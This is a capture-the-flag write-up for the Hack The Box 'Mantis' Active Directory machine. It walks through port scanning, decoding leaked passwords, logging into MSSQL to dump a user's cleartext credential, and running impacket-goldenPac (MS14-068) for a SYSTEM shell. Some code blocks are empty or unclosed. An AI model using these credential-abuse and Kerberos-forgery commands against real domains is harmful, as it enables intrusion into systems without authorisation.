{% include toc icon="cog" title="Mantis Solution" %}

The [Mantis](https://app.hackthebox.com/machines/Mantis) machine has been created by [lkys37en](https://app.hackthebox.com/users/709). This is an **hard** Windows Machine with a strong focus on Active Directory exploitation. This box was interesting as we had to play with SQL and old exploit.

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).

# Reconnaissance

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Scan with Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the TCP ports open on the machine.

**Note:** Always allow a few minutes after the start of an HTB box to make sure that all the services are properly running. If you scan the machine right away, you may miss some ports that should be open.

```

**Remember:** By default, **Nmap** will scans the 1000 most common TCP ports on the targeted host(s). Make sure to read the [documentation](https://nmap.org/docs.html) if you need to scan more ports or change default behaviors.
{: .notice--warning}

Here we have a few interesting ports including an **HTTP** server on TCP/8080. The host is also the domain controller for **htb.local**.

## HTTP Recon

The Web server seems to be running [Orchard](https://orchardcore.net) an ASP.NET CMS. After looking around we didn't find any specific vulnerability on the CMS. Using [gobuster](https://github.com/OJ/gobuster), a brute-force tool for Web services, and a standard wordlist we started a directory enumeration.

Among the results, we found an administration login page.

![image-center](/images/htb/htb_mantis_login.png){: .align-center}

However, after a few tries, no password was found for the admin user.

## More Nmap

After looking around for a while, we gave another try with Nmap. Again, by default, Nmap only scans the 1000 most common ports, let's try to scan all the ports TCP from 1 to 10000.

```bash
$ nmap -Pn -sV -p1-10000 10.129.100.147

Nice, we found another Web server running on **TCP/1337**. Now, let's run `gobuster` again.

```bash

```

One folder seems to be interesting: **secure_notes**.

![image-center](/images/htb/htb_mantis_folder.png){: .align-center}

Moreover, one of the file name seems to have some kind of Base64 encoded value in it, but we will get back to that later.

# Initial Access

In a real-world scenario, adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives or other services.

## Decoding Passwords

By looking at the end of the discovered file, we found an interesting value.

![image-center](/images/htb/htb_mantis_notes.png){: .align-center}

Apparently, it is the admin password of Orchard CMS, encoded in what appears to be binary. Let's see if we can decoded with Python.

```bash
$ python
Python 3.9.10 (main, Jan 16 2022, 17:12:18) 
[GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import binascii
>>> pasw = int("010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001", 2)
>>> binascii.unhexlify("%x" % pasw)
b'@dm!n_P@ssW0rd!'
```

Great, back to the administration page of Orchard.

![image-center](/images/htb/htb_mantis_admin.png){: .align-center}

We can login, but nothing really interesting here. The note file also said that the **sa** account of the database is embedded in the filename. Let's decode it.

```bash
$ echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d                                                                     
6d2424716c5f53405f504073735730726421
```

It looks like hexadecimal value. Maybe we can decode it.

```bash
$ echo 6d2424716c5f53405f504073735730726421 | xxd -r -p 
m$$ql_S@_P@ssW0rd!
```

Now, maybe we can access to the MSSQL server using these credentials and [impacket-mssqlclient](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py).

```bash
$ impacket-mssqlclient 'sa@10.129.100.147'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(MANTIS\SQLEXPRESS): Line 1: Login failed for user 'sa'.
```

Fail... Let's see if we can use the **admin** credentials to login.

```bash
impacket-mssqlclient 'admin@10.129.100.147'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(MANTIS\SQLEXPRESS): Line 1: Login failed for user 'admin'.
```

Still no luck. Maybe we can use **admin** and the password of **sa**.

```bash
$ impacket-mssqlclient 'admin@10.129.100.147'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

```

Finally! Let's explore the database to see if we have some interesting things on it.

## MSSQL Access

We started by listing the databases.

```bash
SQL> SELECT name FROM master.dbo.sysdatabases;
name                                                                                                                               
--------------------------------------------------
master                                                                                                                             
tempdb                                                                                                                             
model                                                                                                                              
msdb                                                                                                                               
orcharddb 
```

Let's take a look at the **orcharddb** database.

```bash
SQL> USE orcharddb;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.

SQL> SELECT table_name FROM information_schema.tables;
table_name                                                                                                                         

--------------------------------------------------------

...[snip]...                                                                       

blog_Orchard_Users_UserPartRecord 

...[snip]...

```

We found a bunch of tables, but **blog_Orchard_Users_UserPartRecord** seems to be promising.

```bash
SQL> SELECT Username, Password FROM blog_Orchard_Users_UserPartRecord;
Username          Password   
--------          ----------------------------------------------------  

admin             AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2A==                                      
James             J@m3s_P@ssW0rd!
```

We have a cleartext password for **james**, maybe this user can login on the remote machine.

```bash
$ crackmapexec smb 10.129.100.147 -u james -p 'J@m3s_P@ssW0rd!' -d htb.local              
SMB         10.129.100.147   445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)

```

# Privilege Escalation

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## MS14-068

The [MS14-068](https://www.trustedsec.com/blog/ms14-068-full-compromise-step-step/) exploit targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Lucky for us, [impacket-goldenPac](https://github.com/SecureAuthCorp/impacket/blob/master/examples/goldenPac.py) can be used to automatically exploit the vulnerability.

However, it requieres to use the domain FQDN so let's add the following line to **/etc/hosts**.
```bash
10.129.100.147 mantis htb.local mantis.htb.local
```

Now, we can use `impacket-goldenPac` to get a **SYSTEM** shell and grab our **first** and **second** flags.

```bash
$ impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
